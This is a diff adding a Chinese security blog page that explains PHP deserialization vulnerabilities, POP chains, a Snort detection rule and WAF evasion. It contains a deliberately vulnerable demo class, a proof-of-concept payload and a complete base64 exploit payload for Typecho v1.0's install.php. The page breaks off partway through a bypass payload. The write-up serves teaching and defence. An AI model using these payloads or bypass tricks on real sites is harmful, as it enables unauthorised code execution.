@@ -1,0 +1,572 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="0x01 PHP反序列化漏洞成因序列化与反序列化
+所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档
+
+serialize() ：返回带有变量类型和值的字符串
+unserialize() ：想要">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>PHP反序列化漏洞成因、防御、绕过 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/gallery/thumbnails/wallhaven-nme2xy.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP反序列化漏洞成因、防御、绕过">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-09 17:17" pubdate>
+        2021年2月9日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP反序列化漏洞成因、防御、绕过</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x01-PHP反序列化漏洞成因"><a href="#0x01-PHP反序列化漏洞成因" class="headerlink" title="0x01 PHP反序列化漏洞成因"></a>0x01 PHP反序列化漏洞成因</h2><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote>
+<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档</p>
+</blockquote>
+<p>serialize() ：返回带有变量类型和值的字符串</p>
+<p>unserialize() ：想要将已序列化的字符串变回 PHP 的值</p>
+<span id="more"></span>
+
+<p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">example</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$new</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">example</span>();<br><span class="hljs-variable">$new</span>-&gt;test=<span class="hljs-string">&quot;sangfor&quot;</span>;<br><span class="hljs-variable">$ser</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>));<br><span class="hljs-meta">?&gt;</span><br><br><br>output:<br><br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br>example <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [test] =&gt; sangfor<br>)<br></code></pre></td></tr></table></figure>
+
+<p>序列化字符串的格式为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;example&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;sangfor&quot;</span>;&#125;<br><br>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝<br></code></pre></td></tr></table></figure>
+
+<p>常见的反序列化数据类型标志：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span> - 整数<br>d - 浮点数<br>O - 对象<br>R - 引用<br>S - 字符串hex<br>s - 字符串<br><span class="hljs-selector-tag">a</span> - 数组<br><span class="hljs-selector-tag">b</span> - 布尔值<br>N - NULL<br></code></pre></td></tr></table></figure>
+
+<h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p>在php中有一些函数不需要调用就可以执行，称这种为方法为魔术方法，常见的PHP魔术函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()，类的构造函数<br><span class="hljs-title function_ invoke__">__destruct</span>()，类的析构函数<br><span class="hljs-title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__get</span>()，获得一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__set</span>()，设置一个类的成员变量时调用<br><span class="hljs-title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时调用<br><span class="hljs-title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="hljs-keyword">unset</span>()时被调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()，执行<span class="hljs-title function_ invoke__">serialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__wakeup</span>()，执行<span class="hljs-title function_ invoke__">unserialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法<br><span class="hljs-title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><span class="hljs-title function_ invoke__">__set_state</span>()，调用<span class="hljs-title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-title function_ invoke__">__clone</span>()，当对象复制完成时调用<br><span class="hljs-title function_ invoke__">__autoload</span>()，尝试加载未定义的类<br><span class="hljs-title function_ invoke__">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></table></figure>
+
+<h3 id="构造攻击链（POP与ROP）"><a href="#构造攻击链（POP与ROP）" class="headerlink" title="构造攻击链（POP与ROP）"></a>构造攻击链（POP与ROP）</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。比如栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
+<p>ROP的核心思想：攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。操作系统通过栈来进行函数的调用和返回。函数的调用和返回就是通过压栈和出栈来实现的。</p>
+<p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
+<h3 id="PHP反序列化漏洞Demo与漏洞利用"><a href="#PHP反序列化漏洞Demo与漏洞利用" class="headerlink" title="PHP反序列化漏洞Demo与漏洞利用"></a>PHP反序列化漏洞Demo与漏洞利用</h3><h4 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;age);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$h</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;h&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="漏洞Poc"><a href="#漏洞Poc" class="headerlink" title="漏洞Poc"></a>漏洞Poc</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload:(适用于<span class="hljs-title function_ invoke__">destruct</span>() <span class="hljs-title function_ invoke__">wakeup</span>())<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;demo&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过参数h将序列化字符串传递给Demo，demo再被反序列化之后自动调用<code>__destruct()</code>魔法函数导致程序运行<code>assert(phpinfo())</code>，这一步骤用到的<code>__destruct()</code>即为攻击链的一个节点，真实环境中需要利用多个节点串联为攻击链，具体实例见下文。</p>
+<h2 id="0x02-防御侧（snort）"><a href="#0x02-防御侧（snort）" class="headerlink" title="0x02 防御侧（snort）"></a>0x02 防御侧（snort）</h2><p>规则示例（非PHP反序列化漏洞）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rules">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS $ORACLE_PORTS ( msg:&quot;SERVER-ORACLE dbms_repcat.purge_master_log buffer overflow attempt&quot;; flow:to_server,established; content:&quot;dbms_repcat.purge_master_log&quot;,nocase; pcre:&quot;/((\w+)[\r\n\s]*\x3a=[\r\n\s]*(\x27[^\x27]&#123;1075,&#125;\x27|\x22[^\x22]&#123;1075,&#125;\x22)[\r\n\s]*\x3b.*gname[\r\n\s]*=&gt;[\r\n\s]*\2|gname\s*=&gt;\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;)|\(\s*(\x27[^\x27]*\x27|\x22[^\x22]+\x22)\s*,\s*(\x27[^\x27]&#123;1075,&#125;|\x22[^\x22]&#123;1075,&#125;))/si&quot;; metadata:ruleset community; reference:url,www.appsecinc.com/resources/alerts/oracle/2004-0001/25.html; classtype:attempted-user; sid:2792; rev:4; )<br></code></pre></td></tr></table></figure>
+
+<p>规则动作举例：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">alert：使用选定的报警方法产生报警信息，并且记录数据包 <br><span class="hljs-built_in">log</span>：记录数据包 <br>pass：忽略数据包 <br><span class="hljs-built_in">activate</span>：报警，接着打开其它的dynamic规则 <br>dynamic：保持空闲状态，直到被activete规则激活，作为一条<span class="hljs-built_in">log</span>规则 <br></code></pre></td></tr></table></figure>
+
+<h2 id="0x03-绕过方法"><a href="#0x03-绕过方法" class="headerlink" title="0x03 绕过方法"></a>0x03 绕过方法</h2><h3 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h3><blockquote>
+<p> 本次漏洞环境采用Typecho v1.0反序列化漏洞</p>
+</blockquote>
+<p>本漏洞的产生位置为<code>install.php</code>，查看文件源码有以下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>    <span class="hljs-title class_">Typecho_Cookie</span>::<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>);<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Typecho_Db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>    <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">addServer</span>(<span class="hljs-variable">$config</span>, <span class="hljs-title class_">Typecho_Db</span>::READ | <span class="hljs-title class_">Typecho_Db</span>::WRITE);<br>    <span class="hljs-title class_">Typecho_Db</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$db</span>);<br></code></pre></td></tr></table></figure>
+
+<p>从上述代码可知两个信息：</p>
+<p>1、GET请求的finish非空</p>
+<p>2、__typecho_config字段中存放payload</p>
+<p>跟进Typecho_Db类发现此类中存在一个构造函数，此构造函数中存在一个将成员与字符串进行拼接的操作，由上文中提到的魔法函数可知，此步骤可能触发<code>__toString()</code>魔法函数，因此从源码中寻找可用的包含<code>__toString()</code>的类。</p>
+<p><img src="https://i.loli.net/2021/02/09/FcJilg6ba81TuAh.png" srcset="/img/loading.gif" lazyload alt="Typecho_Db中的__construct()"></p>
+<p>在Typecho_Feed中找到了可用的<code>__toString()</code>魔法函数</p>
+<p><img src="https://i.loli.net/2021/02/09/hJIcTR7dmSEy2N6.png" srcset="/img/loading.gif" lazyload alt="__toString()"></p>
+<p>在这个魔法函数中找到了属性调用的代码，当目标类中不存在screenName属性时可以触发<code>__get()</code>魔法函数，下一步在源码中寻找可用的<code>__get()</code>魔法函数</p>
+<p><img src="https://i.loli.net/2021/02/09/bvI5XzCSgfGQV4P.png" srcset="/img/loading.gif" lazyload alt="__get()"></p>
+<p>在Typecho_Request中找到了<code>__get()</code>魔法函数：</p>
+<p><img src="https://i.loli.net/2021/02/09/bdpsjBveqYmk7F8.png" srcset="/img/loading.gif" lazyload alt="__get()魔法函数"></p>
+<p><code>__get()</code>魔法函数中调用<code>_applyFilter</code>中又可以用于命令执行的函数<code>call_user_func()</code>：</p>
+<p><img src="https://i.loli.net/2021/02/09/uCQgS976qHm4b8L.png" srcset="/img/loading.gif" lazyload alt="目标函数"></p>
+<p>到这里一条完整的构造链就梳理出来了，完整payload如下：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__typecho_config<span class="hljs-operator">=</span>YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<p>使用上文payload可以执行phpinfo()函数，将payload进行base64解码之后可得以下内容：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过WAF的方式："><a href="#绕过WAF的方式：" class="headerlink" title="绕过WAF的方式："></a>绕过WAF的方式：</h3><p>针对此漏洞，WAF的防御思路应该是根据payload进行base64解码之后的内容做静态内容匹配和正则匹配，比如规则会识别数据包中是否存在Typecho_Request、screenName等字段，但是为了提高识别的精准度和防止误报，应该会加上一些其他的payload特征来达到防御效果，因此下文从攻击者角度介绍几种绕过此类漏洞规则的方法。</p>
+<ul>
+<li><h4 id="序列化字符串之后添加任意内容"><a href="#序列化字符串之后添加任意内容" class="headerlink" title="序列化字符串之后添加任意内容"></a>序列化字符串之后添加任意内容</h4></li>
+</ul>
+<p>序列化字符串之后添加任意字符串不影响序列化结果，如一下payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span 